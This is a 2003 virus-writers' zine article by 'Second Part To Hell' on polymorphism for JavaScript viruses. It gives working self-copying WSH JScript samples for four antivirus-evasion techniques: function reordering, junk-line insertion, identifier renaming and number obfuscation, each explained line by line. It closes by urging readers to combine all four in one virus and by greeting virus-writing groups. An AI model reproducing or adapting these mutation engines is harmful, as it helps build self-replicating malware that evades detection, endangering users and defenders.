@@ -1,0 +1,820 @@
+
+	  *************************************************************
+	  *************************************************************
+	  ************                                      ***********
+	  ************      Polymorphism in JavaScript      ***********
+	  ************     by Second Part To Hell/[rRlf]    ***********
+	  ************                                      ***********
+	  *************************************************************
+	  *************************************************************
+
+.intro words
+
+  The history of JavaScript has been started in 1999, when jackie released his 
+  JS.Optiz in Line Zer0 #2. That was the first virus of it's kind, which
+  infects .JS files. About two years later, in 2001, T-2000 released the 
+  first I-Worm via .JS in Matrix #3 named I-Worm.Dawn and Yello released the
+  first "encrypt" JavaScript virus named JS.3Nokia, which used a VBS-file
+  with the command "replace". Again in 2001, jackie released the first poly
+  engine for JavaScript (it changes the variable names). In 2003, jackie released
+  the first real JS encryption article in rRlf#3 and I made the first JS VCK ever.
+  Today there are about 20 JS-viruses around the world, and beside of these
+  I told you, without any Anti AV technique (neither encryption nor polymorphism).
+
+  That was my inspiration in writting this article. I thought it's a bad fact to
+  don't discover good techniques for viruses in a computer language (JavaScript),
+  and I wanted to do something against that. Well, here we are...
+
+  As everybody knows, polymorphism is changing the code of the program (virus).
+  When I thought about ways how to manage that, three different came to my mind.
+  First one is "body-moving", second one is "adding trash", third one is
+  "changing var or func names" and last one is "number calculating".
+  OK, blabla... ;) Let's start:
+
+
+
+
+
+
+.index
+
+  I told you, that I found three techniques. The article includes examles and
+  explanation for every one. The names of the types came from my mind, don't
+  say anything against them. Thanks! :)
+
+
+
+  1) Body Moving
+  2) Adding Trash
+  3) Changing variable and function names
+  4) Number calculating
+
+
+
+
+
+.Body Moving
+
+  Maybe the name explanes itself. If not, I'll explan it to you:
+  If you make your virus in the normal way, it has always the same form
+  (command A, command B, command C, ...). Now let's change them to ge an other form.
+  The exaple you will see some lines after that is able to make 24 (4*3*2*1) variants
+  of itself. The explanation you'll find after the code.
+
+
+
+ - - - - - - - [body-moving-example] - - - - - - - 
+
+var fso=alpha()
+var fake=doit()
+var fake=ranA()
+var randa, randb, randc, randd
+file.WriteLine("// End")
+
+function alpha()
+{
+  var import=WScript.CreateObject("Scripting.FileSystemObject")
+  return(import)
+}
+
+function doit()
+{
+  file=fso.CreateTextFile("file.js")
+  myfile=fso.OpenTextFile(WScript.ScriptFullName, 1)
+  for (i=0; i<=5; i++) { code=myfile.ReadLine(); file.WriteLine(code) }
+  myfile.Close()
+}
+
+function ranA()
+{
+  for (i=0; i<=25; i++)
+  {
+    cont="";
+    rand=Math.round(Math.random()*3)+1
+    if (rand==1) { if (randa!=1) { cont="function alpha()"; count=4; randa=1 } }
+    if (rand==2) { if (randb!=1) { cont="function doit()"; count=6; randb=1 } }
+    if (rand==3) { if (randc!=1) { cont="function ranA()"; count=12; randc=1 } }
+    if (rand==4) { if (randd!=1) { cont="function ranB(cont, count)"; count=16; randd=1 } }
+    if (cont!="") { fake=ranB(cont, count) }
+  }
+}
+
+function ranB(cont, count)
+{
+  myfile=fso.OpenTextFile(WScript.ScriptFullName, 1)
+  code="";
+  for (j=0; j<=100; j++)
+  {
+    if (code!="// End") { code=myfile.ReadLine() }
+    if (code==cont)
+    {
+      for (k=0; k<=count; k++)
+      {
+        if (code!="// End") { file.WriteLine(code); code=myfile.ReadLine() }
+      }
+    }
+  }
+  myfile.Close()
+}
+// End
+
+ - - - - - - - [end of body-moving-example] - - - - - - - 
+
+
+  The only thing the file is doing is to generate a new variant of itself in the current 
+  directory with the filename "file.js" Nothing more. You can see four different functions
+  (alpha, doit, ranA, ranB). The file writes this functions in the new file, but in
+  different order.
+
+
+ - - - - - - - [explanation of the body-moving sample] - - - - - - -
+
+>> var fso=alpha()
+>> var fake=doit()
+>> var fake=ranA()
+	This 3 lines are something like a call to the different functions.
+        For instands first line (fso) calls the alpha-function.
+
+>> var randa, randb, randc, randd
+	These four variables we'll use in the ranA-function. And because of the
+	fact, that we want to calculate with them, we have to write this line.
+
+>> file.WriteLine("// End")
+	The last line, when somebody runs the file. Why the last line? Everything
+	else runs in the functions we called above.
+
+>> function alpha()
+>> {
+>> var alph=WScript.CreateObject("Scripting.FileSystemObject")
+>> return(alph)
+>> }
+	Our first function. As you can see, the variable "import" is the FileSystemObject.
+	Then it returns the "import". That means, now the "alpha" (the functionsname) has
+	the value of "import". When you're looking in the very first line of the code,
+	you will see "var fso=alpha()". That means, "fso=alpha()=beta=the filesystemobject".
+
+>> function doit()
+>> {
+>> file=fso.CreateTextFile("file.js")
+	A new file will be created. After finishing, this file.js includes our code
+	in different order.
+
+>> myfile=fso.OpenTextFile(WScript.ScriptFullName, 1)
+	We open our code (WScript.ScriptFullName) to read from it (-> 1)
+
+>> for (i=0; i<=5; i++) { code=myfile.ReadLine(); file.WriteLine(code) }
+	We read the first five lines from our code and write them to the new file.
+
+>> myfile.Close()
+>> }
+	And close ourselve.
+
+>> function ranA()
+>> {
+>> for (i=0; i<=25; i++)
+>> {
+	Start of the ranA function!
+	The next things will run 25times.
+
+>> cont="";
+	The variable "cont" is empty, because we have don't want it to be the old content.
+
+>> rand=Math.round(Math.random()*3)+1
+	rand is a random number between 1 and 4!
+
+>> if (rand==1) { if (randa!=1) { cont="function alpha()"; count=4; randa=1 } }
+	if the random-number we searched in the last line is 1 then the variable cont
+	is the value for writing the "alpha-function" to the file. The variable count
+	contains the number of the lines, we want to write to the new file.
+	randa is 1 because he have to check, if it's already written to the file.
+
+>> if (rand==2) { if (randb!=1) { cont="function doit()"; count=6; randb=1 } }
+	The same as the last line: if the random-var-value is 2 then:
+	the searching value of "cont" is the the start of "doit-function"
+	We want to write the whole function, because of that count=6 (doit has 6lines)
+	And set the randb one for avoiding writing the thing again to the file
+
+>> if (rand==3) { if (randc!=1) { cont="function ranA()"; count=12; randc=1 } }
+	The same: searching for ranA-function, write 12 lines and set the randc to 1
+
+>> if (rand==4) { if (randd!=1) { cont="function ranB(cont, count)"; count=16; randd=1 } }
+	The same again!
+
+>> if (cont!="") { fake=ranB(cont, count) }
+	Now we call the ranB function! First we have to heck, if cont<>"", then call the
+	function and give it the informations about what we searching for (cont) and how
+	much lines we want to write.
+
+>> }
+>> }
+	End of the "for" and end of the function.
+
+>> function ranB(cont, count)
+>> {
+	Here the function ranB starts. And as you see above, we're using the to variables
+	from ranA function. cont is the value we'll searching for and count is the number
+	of lines we're writing to the file.js.
+
+>> myfile=fso.OpenTextFile(WScript.ScriptFullName, 1)
+	We open ourselve again to read from it.
+
+>> code="";
+	Have to delete the content of the code-variable. Otherwise the program won't work
+
+>> for (j=0; j<=100; j++)
+>> {
+	Next things will run 100 times
+
+>> if (code!="// End") { code=myfile.ReadLine() }
+	First we're checking, if the old content of "code" is "// End". You can see the
+	"// End" at the end of the code. If you don't check that, there will be an
+	"Read after EOF"-error and we don't want that. OK, is the code isn't "// End", we'll
+	read one line from our code.
+
+>> if (code==cont)
+>> {
+	If the line we read is the line we're searching for (remember the function-name when
+	we called this function), the next things will run.
+
+>> for (k=0; k<=count; k++)
+>> {
+	Next things will run "count"-times. Maybe you remember, that count is the number of lines
+	we want to write.
+
+>> if (code!="// End") { file.WriteLine(code); code=myfile.ReadLine() }
+	First we're checking once more if the line we read isn't the end of the file.
+	If it isn't than we're writing the "code" (line we read before) to the new file and
+	read the next line of our code.
+
+>> }
+>> }
+>> }
+>> myfile.Close()
+>> }
+>> // End
+	First "for", "if" and second "for" ends, we close our file and the function ends.
+	You can see a "// End". It shows the program the end of the file, to don't get the
+	error i explaned before.
+
+ - - - - - - - [end of explanation of the body-moving sample] - - - - - - -
+
+
+
+
+
+
+.Adding Trash
+
+  Adding trash is another nice thing to make it harder to detect the virus. A short
+  explanation of it: You add some junk comments to the file, which don't let the
+  program show any error. The example file (you'll find it some lines after this)
+  includes new variables and "comments" (double-slash [//]) to the new file.
+  The variables don't do anything, and also the comments don't do anything.
+  A nice fact while using this techinque is, that the file has every generation
+  an other size. Note: It's important, that you don't add the trash into next generation,
+  because the code will be bigger and bigger. Now let's have a look at the example.
+  You'll find an explanation of the code after it.
+
+ - - - - - - - [adding-trash-example] - - - - - - - 
+
+ var fso=WScript.CreateObject("Scripting.FileSystemObject")
+file=fso.CreateTextFile("file.js")
+myfile=fso.OpenTextFile(WScript.ScriptFullName, 1)
+for (i=0; i<=100; i++)
+{
+  code=myfile.ReadLine()
+  if (code=="// End") { i=666; }
+  codesn=String.fromCharCode(code.charCodeAt(0))
+  if (codesn!="/" && codesn != "v")
+  { 
+    if (Math.round(Math.random()*3)+1==2)
+    {
+      rand=Math.round(Math.random()*2)+1 
+      if (rand==1) { file.WriteLine("var "+namegen()+"="+unescape("%22")+namegen()+namegen()+unescape("%22")) }
+      if (rand==2) { file.WriteLine("// "+namegen()) }
+      if (rand==3) { file.WriteLine("var "+namegen()+"="+Math.round(Math.random()*9999999)) }
+    }
+    file.WriteLine(code)
+  }
+}
+file.WriteLine("// End")
+
+function namegen()
+{
+  var name=""
+  for (j=0; j<=Math.round(Math.random()*15); j++) 
+  {
+    name=name+unescape("%"+(Math.round(Math.random()*18)+61)) 
+  }
+  return(name)
+}
+// End
+
+ - - - - - - - [end of adding-trash-example] - - - - - - - 
+
+
+  Once more the example makes a new generation of itself in the current directory
+  with the filename "file.js". Noting more.
+  Now let's explain the lines of code.
+
+
+ - - - - - - - [explanation of the adding-trash sample] - - - - - - -
+
+>>  var fso=WScript.CreateObject("Scripting.FileSystemObject")
+	Now the variable "fso" is the FileSystemObject. Important note:
+	Infront of the real code is a space. That's important, otherwise
+	the program "thinks", that's also a trash-code and don't write it
+	to next generation and the program won't work anymore.
+
+>> file=fso.CreateTextFile("file.js")
+>> myfile=fso.OpenTextFile(WScript.ScriptFullName, 1)
+	Here we're generating a new file (file.js - it should be our new file) and
+	opening our file to read from it.
+
+>> for (i=0; i<=100; i++)
+>> {
+	Next things will be run 100 times (for every line one time, but you know,
+	we added also trash-lines of code. Because of that 100 times.
+
+>> code=myfile.ReadLine()
+	Read one line of our file and save it to variable "code".
+
+>> if (code=="// End") { i=666; }
+	In the end of the code you'll see a mark "// End". Now we're checking if the
+	code is this mark (If yes, we're at the end of the code and have to stop reading:
+	so we set the counter (variable "i") to 666. (101 would also work, but I thought,
+	666 is better :D )
+
+>> codesn=String.fromCharCode(code.charCodeAt(0))
+	Now code is the first sign of the variable "code". (this line is from jackie's
+	"don't hide, come out! (jscript encryption, a humble approach)". Thanks!) Why we
+	need the first sign of "code"? Because we have to check, if it's a normal line
+	or a trash-line.
+
+>> if (codesn!="/" && codesn != "v")
+>> { 
+	I tod you, that "codesn" is the first sign of "code". Now we check, if it isn't
+	"/" or "v" (this lines are trash lines). If it isn't so, the program will run next
+	lines.
+
+>> if (Math.round(Math.random()*3)+1==2)
+>> {
+	We don't want to add a trash line to every line, because of that we have to use 
+	a random number to check, if it should be written. If the random number we're
+	searching for is two, we'll add trash ( we'll run next lines)
+
+>> rand=Math.round(Math.random()*2)+1 
+	Again a random-number. Now we check, which one of the three trash types we'll write.
+
+>> if (rand==1) { file.WriteLine("var "+namegen()+"="+unescape("%22")+namegen()+namegen()+unescape("%22")) }
+	Type one: It writes something like [var hbsdfhish="ksjdfhhfskdjhfhksdjfuo"] to the file.
+	You may wonder what "namegen()" means. That's some random-signs generated by the
+	function "namegen". You'll find it some lines after that code.
+	
+>> if (rand==2) { file.WriteLine("// "+namegen()) }
+	Type two: it writes something like [// jowkcnan] to the file.
+
+>> if (rand==3) { file.WriteLine("var "+namegen()+"="+Math.round(Math.random()*9999999)) }
+	Type three: It writes something like [var jdiqpk=5482758] to the file.
+
+>> }
+>> file.WriteLine(code)
+>> }
+>> }
+>> file.WriteLine("// End")
+	End of the first if. Than we're writing the code we already read from our code to
+	the file. Then the Second "if" and the "for" ends. In the of the new file we're
+	writing a "// End", because we've to know, that here the code ends. If you think, we
+	already write this to the code: No, remember, we don't write anything beginning with "/"
+
+>> function namegen()
+>> {
+	Function "namegen" starts. Here we'll make our random names.
+
+>>   var name=""
+	Important line. If we don't write it, there will be an error.
+
+>> for (j=0; j<=Math.round(Math.random()*15); j++) 
+>> {
+	Next things will run [1-15] times. Why that? Because we want a random size of the
+	new variable.
+
+>> name=name+unescape("%"+(Math.round(Math.random()*18)+61)) 
+	Here we'll make the random variable. It's called "name" and will contain only lowercase
+	letters. You can see the [unescape("%"+random-number)]. That's something like "chr(...)"
+	in VB.
+
+>> }
+>> return(name)
+>> }
+>> // End
+	The "for" ends. Then we return the variable "name". Now we can use it, when we call "namegen()"
+	After this the function ends. And last line, as I told about 100 times, is the "// End", which
+	shows us the End Of File.
+
+- - - - - - - [end of explanation of the adding-trash sample] - - - - - - -
+
+
+
+
+
+
+.Changing variable and function names
+
+  Changing the variable names is an other nice technique, and maybe the most 
+  successfully of all. A shourt explanation: Most JavaScripts uses much variables
+  (like a variable for the FileSystemObject or something like that) or functions
+  to make the code smaller. Variables or functions don't need to have a static
+  name, that means, you can change them. That's the prinzip of the next example.
+  Changing these names means very hard detection of the virus by AVs.
+  OK, now let's have a look at the example.
+
+ - - - - - - - [changing-names example] - - - - - - - 
+
+var fso=WScript.CreateObject("Scripting.FileSystemObject")
+myfile=fso.OpenTextFile(WScript.ScriptFullName,1)
+mycode=myfile.ReadAll()
+myfile.Close()
+
+file=fso.CreateTextFile("newvir.js")
+file.Write(mycode+String.fromCharCode(47)+String.fromCharCode(47))
+file.close()
+
+for (l=0; l<10; l++)
+{
+  code=changeit(l)
+  file=fso.OpenTextFile("newvir.js",2)
+  file.Write(code+String.fromCharCode(47))
+  file.Close()
+}
+
+function changeit(i)
+{
+  var code=""; wrte="";
+  var changevars=new Array("fso", "changeit", "myfile", "mycode", "file", "wrte", "randname", "namegen", "check", "code", "changevars")
+  myfile=fso.OpenTextFile("newvir.js",1)
+  randname=namegen()
+  for (k=0; k<2500; k++)
+  {
+    check=1;
+    if (wrte!=String.fromCharCode(47))
+    { 
+      wrte=myfile.Read(1)
+      if (wrte==changevars[i].substring(0,1))
+      {
+        for (m=1; m<changevars[i].length; m++)
+        {
+         wrte+=myfile.Read(1)
+         if (wrte!=changevars[i].substring(0,m+1)) { m=666 }
+        }
+        if (wrte==changevars[i]) { code+=randname; check=0; }
+      }
+      if (check) { code+=wrte }
+    }
+  }
+  return(code)
+}
+
+function namegen()
+{
+  var randomn=""
+  for (j=0; j<=Math.round(Math.random()*15)+5; j++) { randomn+=unescape("%"+(Math.round(Math.random()*18)+61)) }
+  return(randomn)
+}
+//
+
+ - - - - - - - [end of changing-names example] - - - - - - -
+
+
+  As you can see, the examle uses a array with all the variable names, which have to be
+  changed. Than it searchs in every letter for the start of the variable-name, that it
+  should change. If there's no variable, it copies the letter to "code". Else it copies
+  a new random name to the "code". This new letter is the new variable or function name.
+  Now I'm going to explain you every line.
+
+
+- - - - - - - [explanation of the changing-names sample] - - - - - - -
+
+>> var fso=WScript.CreateObject("Scripting.FileSystemObject")
+>> myfile=fso.OpenTextFile(WScript.ScriptFullName,1)
+>> mycode=myfile.ReadAll()
+>> myfile.Close()
+	First line means, that "fso" is the FileSystemObject. Than we open ourselve,
+	read everything from it and close ourselve. As you can see, "mycode" is the
+	whole content of our file.
+
+>> file=fso.CreateTextFile("newvir.js")
+>> file.Write(mycode+String.fromCharCode(47)+String.fromCharCode(47))
+>> file.close()
+	We're createing a new file named "newvir.js" and write our code+"//" to it
+	The "String.fromCharCode(...)" is something like "chr$(...)" in VB.
+	And the ASCII from "47" is "/". After doing that, we close the file.
+
+>> for (l=0; l<10; l++)
+>> {
+	The next things runs 11 times (10+"0"=11), because we have to change 11 variables.
+
+>> code=changeit(l)
+	We call the function "changeit" and give it the value "l". That's the
+	counter of this "for". (1.run:0; 2.run:1; 3.run:2; ...). The "return-value"
+	of the function will be copy to "code".
+
+>> file=fso.OpenTextFile("newvir.js",2)
+>> file.Write(code+String.fromCharCode(47))
+>> file.Close()
+>> }
+	We open the "newvir.js" again to write (2). We write the "code" and a "/" to the
+	file and close it. Than the "for" ends.
+
+>> function changeit(i)
+>> {
+	You can see: Here is the start of the "changeit"-function.
+
+>> var code=""; wrte="";
+	We set the value of the variables "code" and "wrte" to nothing. If we don't do that,
+	the whole code won't work.
+
+>> var changevars=new Array("fso", "changeit", "myfile", "mycode", "file", "wrte", "randname", "namegen", "check", "code", "changevars")
+	That's the array with all the variable-names, which have to be changed. As you can see,
+	there are 11 ones.
+
+>> myfile=fso.OpenTextFile("newvir.js",1)
+	We open the "newvir.js" to read from it. This file contains our whole code
+
+>> randname=namegen()
+	Now the variable "randname" is the value of the return from "namegen"-function. That value is
+	a random name with 5 to 20 letters. We have to save that value, otherwise every variable we
+	wanna change has an other name. (for instands: 1.fso: kgfoqm, 2.fso: oemvhqp, ...)
+
+>> for (k=0; k<2500; k++)
+>> {
+       	Next things will run 2500 times (because the size of the code - you have to know, that ever
+	variable could be 20 bytes).
+
+>> check=1;
+	"check" is a variable which tells us, if we've already written a piece of code to the file.
+	Value 1: We have to write, Value 2: We did.
+
+>> if (wrte!=String.fromCharCode(47))
+>> {
+	We check, if we read a "/". If yes, we're at the end of the file. If it's not, the next things
+	run.
+
+>> wrte=myfile.Read(1)
+	"wrte" is one byte of our code.
+
+>> if (wrte==changevars[i].substring(0,1))
+>> {
+	We check, if "wrte" is the first byte of the variable we're searching for at the moment.
+	If yes, we do the other things too.
+
+>> for (m=1; m<changevars[i].length; m++)
+>> {
+	We'll repeat the next lines as often as the variable we're searching for is long. m=1 because 
+	we already read one byte.
+
+>> wrte+=myfile.Read(1)
+	Now we read one more byte and add it to the variable wrte.
+
+>> if (wrte!=changevars[i].substring(0,m+1)) { m=666 }
+	If the numbers of bytes, which we read, is not the part of the variable, which we're searching
+	for, then we stop the "for". Let's set "m" to 666. The for runs as often as the size of the 
+	variable, which we are searching for. And the biggest size of a variable is 20 (5+15). So we stop
+	it in an easy way.
+
+>> }
+>> if (wrte==changevars[i]) { code+=randname; check=0; }
+	End of the first "for". Next line: if the things we read from the file is the same as the variable
+	we are searching for, then we'll add the new variable to the code and set check to zero, because we
+	already added it.
+
+>> }
+>> if (check) { code+=wrte }
+	End of an "if". Now we check, if we added the things from reading to "code" or not. if not, then
+	we'll add it.
+
+>> }
+>> }
+>> return(code)
+>> }
+	End of the "if" and end of the "for". Now we return the "code" to the main program. Now the 
+	main program can use "code" via "changeit()". (That's the name of the currents function. And 
+	the function "changeit" ends.
+
+>> function namegen()
+>> {
+	The function "namegen" starts.
+
+>> var randomn=""
+	We have to set "randomn" to nothing, otherwise the program won't work.
+
+>> for (j=0; j<=Math.round(Math.random()*15)+5; j++) { randomn+=unescape("%"+(Math.round(Math.random()*18)+61)) }
+	That's an important line. It searchs for a random name. The variable "randomn" is a random 
+	name with [5..20] letters.
+
+>> return(randomn)
+>> }
+	We return this random name to the main program and close the function "namegen"
+
+>> //
+	Here you can see the "//". This tells our program, that there is the end of the
+	whole code, and we don't have to read anymore.
+
+- - - - - - - [end of explanation of the changing-names sample] - - - - - - -
+
+
+
+
+
+
+.Number calculating
+
+  This technique came to my mind while I was trying to include the three other techniques
+  in one virus. It's a quite good technique to fake AVs because they have to calculate
+  with all the numbers. If they do so, it will use fucking much time. The main idea
+  behind this script is, that [1]=[2-1]=[4*2-7]=[33/11*2/6] ... I guess, you know what
+  I mean. OK, now let's have a look at the code.
+
+ - - - - - - - [number-calculating-example] - - - - - - - 
+
+var fso=WScript.CreateObject('Scripting.FileSystemObject'); code='';
+fileall=fso.OpenTextFile(WScript.ScriptFullName,1).ReadAll()
+file=fso.OpenTextFile(WScript.ScriptFullName,1)
+for (i=1; i<fileall.length; i++) 
+{
+  sign=file.Read(1)
+  checka=1;
+  if (sign.charCodeAt(0)>47 && sign.charCodeAt(0)<58)
+  {
+    checka=0; findfullnumber(sign)
+  }
+  if (checka) { code+=sign; }
+}
+file.Close()
+WScript.Echo(code)
+file=fso.OpenTextFile(WScript.ScriptFullName,2)
+file.Write(code+'}')
+file.Close()
+
+function findfullnumber(sign)
+{
+  number=sign;
+  for (j=i; j<fileall.length; j++)
+  {
+    check=1; sign=file.Read(1); i++;
+    if (sign.charCodeAt(0)>47&& sign.charCodeAt(0)<58 || sign=='.') { number+=sign; check=0;}
+    if (check==1) { j=fileall.length }
+  }
+  calc=Math.round(Math.random()*2)+1;
+  rand=Math.round(Math.random()*10)+1; 
+  if (calc==1) { newnum='('+(number-rand)+'+'+rand+')' }
+  if (calc==2) { newnum='('+(number/1+rand)+'-'+rand+')' }
+  if (calc==3) { newnum='('+(number*rand)+'/'+rand+')' } 
+  code+=newnum+sign;
+}
+
+ - - - - - - - [end of number-calculating-example] - - - - - - - 
+
+  This file, while running, change every number to something else. For instands it changes
+  [2] to [3+3/3] or whatever. You have to know, that this code is just a prove of concept
+  and you are able to improve the whole thing. For instands in that way:
+  ...
+  eval(String.fromCharCode([here your whole viruscode in chr]))
+  ...
+  You will get tons of numbers, and because of that the above script will be much more
+  successfully. Hmm, ok, now I will explain the lines, so you'll know, what it does.
+
+
+ - - - - - - - [explanation of number-calculating-example] - - - - - - - 
+
+>> var fso=WScript.CreateObject('Scripting.FileSystemObject'); code='';
+>> fileall=fso.OpenTextFile(WScript.ScriptFullName,1).ReadAll()
+>> file=fso.OpenTextFile(WScript.ScriptFullName,1)
+	We declate 'FileSystemObject', set code to nothing, open the file to read all
+	(because we need the length of the file) and open it again, because we want 
+	write.
+
+>> for (i=1; i<fileall.length; i++) 
+>> {
+	We do the next things as often as our file is long in bytes. (?!? :D)
+>> sign=file.Read(1)
+>> checka=1;
+	Read one letter from the code and set 'checka' to 1.
+
+>> if (sign.charCodeAt(0)>47 && sign.charCodeAt(0)<58)
+>> {
+	Check if the letter we found is a number
+>> checka=0; findfullnumber(sign)
+>> }
+	If yes, checka=0 and we call 'findfullnumber', because the number could have more
+	than one sign (for instands: 12). End of the if-part.
+
+>> if (checka) { code+=sign; }
+>> }
+	If we found no number, we'll add the letter to the variable 'code'. End of the
+	for-part
+
+>> file.Close()
+>> WScript.Echo(code)
+>> file=fso.OpenTextFile(WScript.ScriptFullName,2)
+>> file.Write(code+'}')
+>> file.Close()
+	We close the file with read-access, write a msg-box with the new code, open the
+	file again with write-access and write the code +'}' to the file and close it again.
+	We need to write '}', because the last letter of the code ('}') won't be added to
+	the variable 'code'.
+
+>> function findfullnumber(sign)
+>> {
+>> number=sign;
+	Let's start to search for the whole number. Add sign (the letter, which is a number)
+	to 'number'.
+>> for (j=i; j<fileall.length; j++)
+>> {
+	We do the next things as often as our filesize, because the number could have 1000
+	signs or more, and I had no better idea to do this. :)
+
+>> check=1; sign=file.Read(1); i++;
+	Set 'check' to 1. We read one letter of our file, and increase 'i', otherwise there
+	will be a 'read after file-end'-error.
+
+>> if (sign.charCodeAt(0)>47&& sign.charCodeAt(0)<58 || sign=='.') { number+=sign; check=0;}
+	Check if the letter we read is a number or a comma. If yes, add the letter to the
+	variable, which contains the number. And set check to zero.
+
+>> if (check==1) { j=fileall.length }
+>> }
+	if check is still one (= number ended) we set the length of our file to j (to
+	stop the 'for'-part.
+
+>> calc=Math.round(Math.random()*2)+1;
+>> rand=Math.round(Math.random()*10)+1; 
+	Two random numbers, which we need to generate the new calculation.
+
+>> if (calc==1) { newnum='('+(number-rand)+'+'+rand+')' }
+>> if (calc==2) { newnum='('+(number/1+rand)+'-'+rand+')' }
+>> if (calc==3) { newnum='('+(number*rand)+'/'+rand+')' } 
+	Generating the new calculations. You may wonder in line two the '/1'. Windows
+	'thinks', that 'number' is a string, because of that it will add 'rand' as string
+	and not as number (12+2=122). With this trick we change the string to a number:
+	(12+2=14). I added before and after the calculation a '(' and ')' because
+	add and dec are 'Level One' calculating-signs, and mul and div are 'Level Two'.
+
+>> code+=newnum+sign;
+>> }
+	Add the new calculation to code.
+
+ - - - - - - - [explanation of number-calculating-example] - - - - - - - 
+
+
+
+
+
+
+.last words
+
+  I think, polymophism is the best technique in scripts to avoid detection of AVs. One polymorphic
+  techique is good, two are better and three are the best and now guess, what will be up, if you use 
+  four differend polymorphism techniques in one virus. It would be no problem to add all these
+  techniques in one virus. In fact, I think, it would be a big problem for AVs to detect all variants
+  of such a virus.
+  Now, at the end of the article, I hope that you've enjoyed reading this and you didn't become bored.
+  One important fact I forgot: Please forgive me my grammer or spelling mistakes in this article.
+  English isn't my nativ language and I'm to lazy to learn writing without mistakes. :D
+  At the end I wanna send some greets or thanks messages out to the world:
+
+  - SlageHammer          <-- Much thanks for the idea with the JavaScript history :)
+  - jackie               <-- Something like a pioneer at JS: Made the first JS infector and the first JS poly engine
+  - kefi                 <-- JS-rulez :D
+  - SAD1c                <-- Cool JS-encrypter, unfortunatly it doesn't work perfect :)
+  - philet0ast3r         <-- Auf Hemp Hover's BAT-VCK source schaun und nix mitbekommen +lol+
+  - Disk0rdia            <-- Falls wir uns nochmal treffen will ich ne Revange im Billiard, und du tust schön Tischfussballspielen üben! :)
+  - Gigabyte             <-- A feminin virus coder: kewl! hehe...
+  - Knowdeth             <-- Metaphase rules, I want to see more from you!
+  - VirusBuster          <-- One of the coolest guy I've ever had contact
+  - Vorgon               <-- Thanks for the tons of info you gave me in win32asm
+  - VorteX               <-- One of the first person helped me with virii things! Where are you??
+  - Worf                 <-- For sending me much viruses long time ago. Also the question to you: Where are you?
+  - Necronomikon         <-- Glaubst du noch an eine Zer0Gravity #1?
+  - prizzy               <-- Very many thanks for writing me that mail!!!
+  - SnakeByte            <-- Glaubst du, es ist eine gute Idee, den source des besten VCKs der Welt verrecken zu lassen? :D
+  - herm1t               <-- For hosting me...
+  - Doctor Rave          <-- Vielen dank für alles, wast für mich getan hast!
+  - VxF                  <-- You still don't like your old (longer) nick? :)
+  - MetalKid             <-- NickRipper!!! :D
+  - PanoiX               <-- #backdoor-rulez! Danke für X-access!
+  - Perikles             <-- Many thanks for X-access in #vxers!
+  - Zed, Industry, Adious, DvL, Nekr0, Arzy <-- I want to see more from you!!!
+  - much other I forgot  <-- Thanks for sources, helping me or whatever,...
+
+  - channel-greets flies to #virus, #vir, #vxers, #gigavirii, #backdoor, #blackgate
+  - group-greets goes to rRlf (sure :D), 29A, iKx, MetaPhase, TKT, MIONS
+
+
+							- - - - - - - - - - - - - - -
+							  Second Part To Hell/[rRlf]  
+							  www.spth.de.vu
+							  spth@aonmail.at
+							  written from may-august 2003
+							  Austria
+							- - - - - - - - - - - - - - - 
